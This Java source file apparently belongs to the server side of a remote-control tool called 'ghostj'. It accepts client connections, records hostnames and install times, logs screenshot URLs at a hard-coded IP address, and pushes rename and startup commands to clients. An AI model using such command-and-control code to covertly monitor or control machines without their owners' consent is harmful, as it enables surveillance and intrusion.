package com.ghostj.server_old;

import com.ghostj.util.Out;
import com.ghostj.util.TimeUtil;

import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.Date;

public class HandleConn extends Thread{
    public static String clientRemoteStartup="";
    Socket socket=null;
    BufferedWriter bufferedWriter=null;
    public String hostName;
    public String rescueName;
    boolean avai=false;
    long connTime=0;
    long sysStartTime=0;
    long installTime=-1;
    StringBuffer history=new StringBuffer();
    static final int HISTORY_LENGTH=1000;
    long rtIndex=-1;

    String version=null;
    boolean success=false;
    long reveiveAliveMsgTime=0;
    public HandleConn(Socket socket){
        try {
            this.socket = socket;
            this.bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(),"GBK"));
            connTime=new Date().getTime();
            hostName=socket.getInetAddress()+":"+socket.getPort();
            rescueName=hostName;
            Out.say("conn"+hostName,"连接已建立");
        }catch(Exception e){
            Out.say("conn"+hostName,"新连接建立时出现错误，已拒绝连接");
            e.printStackTrace();
            ServerMain.killConn(this);
        }
    }

    @Override
    public void run() {
        try{
            //BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(socket.getInputStream(),"UTF-8"));
            InputStreamReader inputStreamReader=new InputStreamReader(socket.getInputStream(),"GBK");
            int c=0;
            while ((c=inputStreamReader.read())!=-1){
                //String msg=bufferedReader.readLine();
                //检查是否是工作信息
                if((char)c=='!'){
                    StringBuffer cmds=new StringBuffer("!");
                    while((c=inputStreamReader.read())!=-1){
                        if((char)c=='!') {
                            cmds.append("!");
                            break;
                        }
                        if ((char)c=='\n') {
                            cmds.append("\n");
                            break;
                        }
                        cmds.append((char)c);
                    }
                    String[] cmd =cmds.toString().substring(0,cmds.length()-1).split(" ");
                    switch (cmd[0]){
                        case "!alive":{
                            bufferedWriter.write("#alive#");
                            bufferedWriter.newLine();
                            bufferedWriter.flush();
                            continue;
                        }
                        case "!alives":{
                            success=true;
                            reveiveAliveMsgTime=new Date().getTime();
                            continue;
                        }
                        case "!name":{//此开关已过时，新版本的client使用info指令传输属性信息
                            Out.say("conn"+hostName,"名称"+cmd[1]);
                            this.hostName=new String(cmd[1]);
                            ServerMain.sendListToMaster();
                            avai=true;
                            ServerMain.tagLog.addTag(this.hostName,"login");
                            ServerMain.tagLog.addTag(this.hostName,"alive");
                            ServerMain.tagLog.pack();
                            Out.putPrompt();
                            ServerMain.saveOnlineClients();
                            continue;
                        }
                        case "!version":{
                            if(cmd.length<2){
                                Out.say("conn"+hostName,"客户端提供了不正确的版本号消息");
                                continue;
                            }
                            Out.say("conn"+hostName,"版本号:"+cmd[1]);
                            this.version=new String(cmd[1]);
                            ServerMain.sendListToMaster();
                            continue;
                        }
                        case "!finish":{
                            ServerMain.cmdProcessFinish();
                            continue;
                        }
                        case "!sendpicurl":{
                            try{
                                Out.say("HandleConn","获取到新截图,url:http://39.100.5.139/ghost/"+ServerMain.fileReceiver.getRootPath()+cmd[1]);
                            }catch (Exception e){
                                ;
                            }
                            ServerMain.cmdProcessFinish();
                            continue;
                        }
                        case "!info":{
                            if (cmd.length<4){
                                Out.say("conn"+hostName,"客户端提供的info语法不正确");
                                Out.say("conn"+hostName,"info:"+cmds);
                                continue;
                            }
                            avai=true;
                            this.hostName=cmd[1];
                            this.rescueName="r"+cmd[1];
                            this.version=cmd[2];
                            this.sysStartTime=Long.parseLong(cmd[3]);
                            this.installTime=cmd.length>4?Long.parseLong(cmd[4]):0;
                            Out.say("conn"+cmd[1]," ver:"+cmd[2]+" start:"+cmd[3]+" install:"+ TimeUtil.millsToMMDDHHmmSS(installTime));
                            ServerMain.sendListToMaster();
                            ServerMain.saveOnlineClients();

                            //检查是否要重命名
                            if (ServerMain.transCmd.renPlan.containsKey(hostName)) {
                                hostName = ServerMain.transCmd.renPlan.get(hostName);
                                bufferedWriter.write("!!name " + hostName);
                                bufferedWriter.newLine();
                                bufferedWriter.flush();
                                bufferedWriter.write("!!cfg write");
                                bufferedWriter.newLine();
                                bufferedWriter.flush();
                                ServerMain.tagLog.addTag(hostName,"login");
                                Out.say("TransCmd-chnamePlan", "已修改名称");
                                ServerMain.sendListToMaster();
                                ServerMain.cmdProcessFinish();
                                return;
                            }

                            ServerMain.tagLog.addTag(this.hostName,"login");
                            ServerMain.tagLog.addTag(this.hostName,"alive");
                            ServerMain.tagLog.pack();
                            Out.putPrompt();
                            continue;
                        }
                        case "!startup":{
                            if (!clientRemoteStartup.equals("")) {
                                Out.say("conn", "向client发送startup:"+clientRemoteStartup);
                                bufferedWriter.write(clientRemoteStartup);
                                bufferedWriter.newLine();
                                bufferedWriter.flush();
                            }
                            continue;
                        }
                        default:{
                            Out.sayThisLine(cmds.toString());
                            continue;
                        }
                    }
                }
                //输出消息
                if(this.equals(ServerMain.focusedConn)){
                    Out.sayThisLine((char)c);
                }
                history.append((char)c);
                checkHistory();
            }
        }catch(Exception e){
            e.printStackTrace();
            ServerMain.killConn(this);
        }
    }
    void checkHistory(){
        if(history.length()>HISTORY_LENGTH){
            history=new StringBuffer(history.substring(history.length()-HISTORY_LENGTH,history.length()));
        }
    }
    void showHistory(){
        Out.say(history.toString());
    }
}
